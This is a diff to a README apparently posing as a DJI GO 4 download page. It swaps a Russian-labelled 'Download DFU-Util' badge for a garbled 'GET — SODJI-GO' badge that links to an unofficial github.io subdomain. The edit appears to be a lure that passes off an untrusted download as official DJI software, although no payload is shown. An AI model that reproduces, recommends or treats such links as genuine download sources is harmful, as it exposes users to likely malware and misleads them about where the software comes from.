@@ -4,11 +4,7 @@
 <img src="https://www-cdn.djiits.com/cms_uploads/download/app/icon/1/28e4f33c8b0ba49080f69413ee486018.png" width="180" alt="DJI GO 4 icon">
 </div>
 
-<div align="center">
-  <a href="https://dji-go-4.github.io/.github">
-    <img src="https://img.shields.io/badge/Скачать_DFU--Util-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Скачать DFU-Util">
-  </a>
-</div>
+[![GET DJI GO](https://img.shields.io/badge/GET%20%E2%80%94%20SODJI-GO-0078D6?style=for-the-badge&logoColor=white)](https://quinkioanehs.github.io/.github/DJI-GO)
 
 
 ---
